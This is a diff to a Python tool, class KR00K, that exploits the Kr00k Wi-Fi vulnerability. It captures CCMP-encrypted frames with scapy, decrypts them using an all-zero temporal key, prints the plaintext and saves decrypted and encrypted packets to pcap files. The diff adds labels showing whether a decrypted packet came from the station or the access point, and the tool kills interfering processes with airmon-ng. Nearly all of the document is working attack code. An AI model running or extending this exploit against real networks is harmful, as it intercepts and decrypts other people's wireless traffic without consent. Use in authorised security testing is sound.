@@ -51,15 +51,14 @@ class KR00K:
 
         if pkt.haslayer(Dot11CCMP):
             try:
-                #qos = pkt[Dot11QoS]
-                #ccmp = pkt[Dot11CCMP]
-                #fcs = pkt[Dot11FCS]
+                # qos = pkt[Dot11QoS]
+                # ccmp = pkt[Dot11CCMP]
+                # fcs = pkt[Dot11FCS]
                 addr1 = re.sub(":","",pkt.addr1)
                 addr2 = re.sub(":","",pkt.addr2)
                 addr3 = re.sub(":","",pkt.addr3)
                 # addr4 = re.sub(":","",fcs.addr4)
                 PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(pkt.PN5,pkt.PN4,pkt.PN3,pkt.PN2,pkt.PN1,pkt.PN0)
-                
                 """
                 AAD = ((bytes.fromhex(fcs.FCfield.value) + bytes.fromhex(addr1) + bytes.fromhex(addr2) \
                     + bytes.fromhex(addr3) + bytes.fromhex(fcs.SC) + bytes.fromhex(addr4) + bytes.fromhex(qos.TID))\
@@ -79,13 +78,22 @@ class KR00K:
                 assert plain_text.startswith(b'\xaa\xaa\x03'), "All-0 TK failed to decrypt"
                 eth_header = bytes.fromhex(addr3 + addr2) + plain_text[6:8]
                 packet = eth_header + plain_text[8:]
-                self.SUCCESS("kr00k packet arrived !")
+                
+                if self.sta_mac!=None and self.ap_mac!=None:
+                    if self.sta_mac.lower() == pkt.addr2:
+                        self.SUCCESS("kr00k PACKET ARRIVED FROM THE STATION!")
+                    elif self.ap_mac.lower() == pkt.addr2:
+                        self.SUCCESS("kr00k PACKET ARRIVED FROM THE AP!")
+                    else:
+                        self.SUCCESS("kr00k PACKET ARRIVED!")  
+                else:
+                    self.SUCCESS("kr00k PACKET ARRIVED!")
 
                 if not self.quiet:
                     hexdump(packet)
                 if self.dst_path:
-
-                    wrpcap(self.dst_path, packet, append=True)
+                    wrpcap(self.dst_path + ".decrypted", packet, append=True)
+                    wrpcap(self.dst_path + ".encrypted", pkt, append=True)
 
 
             except AssertionError:
@@ -126,16 +134,16 @@ def main():
 
 
         kr00k = KR00K(options)
-        #if os.getuid() != 0:
-        #    kr00k.ERROR("please run as root")
-        #    exit(0)
+        # if os.getuid() != 0:
+        #     kr00k.ERROR("please run as root")
+        #     exit(0)
         kr00k.INFO("killing processes that could cause trouble. (airmon-ng check kill)")
         run(['airmon-ng check kill'], shell=True, stdout=PIPE)
         # interface_mode: CompletedProcess = run(['iwconfig ' + options.interface], shell=True, stdout=PIPE)
-        #kr00k.INFO("initiating monitor mode")
-        #run(['airmon-ng start ' + options.interface], shell=True, stdout=PIPE)
-        #kr00k.INFO("switching to specified channel")
-        #run(['iwconfig ' + options.interface + ' channel ' + str(options.channel)], shell=True, stdout=PIPE)
+        # kr00k.INFO("initiating monitor mode")
+        # run(['airmon-ng start ' + options.interface], shell=True, stdout=PIPE)
+        # kr00k.INFO("switching to specified channel")
+        # run(['iwconfig ' + options.interface + ' channel ' + str(options.channel)], shell=True, stdout=PIPE)
         kr00k.INFO("engaging")
         # spinner = spinning_cursor()
         # for _ in range(50):
@@ -158,15 +166,11 @@ def spinning_cursor():
         for cursor in '|/-\\':
             yield '\033[1;34m'+cursor+"\033[0m"
 
-
-
 def test():
     packets = rdpcap('WPA2-PSK-Final.cap')
     pkt = packets[483]
     ccmp = (pkt[Dot11CCMP])
     PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(ccmp.PN5,ccmp.PN4,ccmp.PN3,ccmp.PN2,ccmp.PN1,ccmp.PN0)
-
-
 
 if __name__ == '__main__':
     main()
